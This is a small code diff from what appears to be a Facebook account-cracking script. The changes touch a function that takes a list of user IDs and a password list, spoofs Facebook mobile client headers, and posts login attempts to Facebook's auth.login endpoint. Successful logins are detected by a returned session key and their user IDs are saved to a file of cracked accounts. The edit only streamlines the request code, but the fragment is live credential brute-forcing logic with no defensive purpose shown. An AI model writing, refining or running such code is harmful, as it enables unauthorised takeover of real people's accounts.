@@ -687,11 +687,9 @@ def rndm(ids,passlist):
                                         'X-Fb-Http-Engine': 'Liger',
                                         'X-Fb-Client-Ip': 'True',
                                         'X-Fb-Server-Cluster': 'True',}
-                                url = 'https://b-api.facebook.com/method/auth.login'
-                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-                                q = json.loads(po)
-                                if 'session_key' in q:
-                                        uid=str(q['uid'])
+                                po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head).json()
+                                if 'session_key' in po:
+                                        uid=str(po['uid'])
                                         try:
                                                 okk=open('/sdcard/AKING-OK.txt','r').read()
                                                 if uid in okk:pass
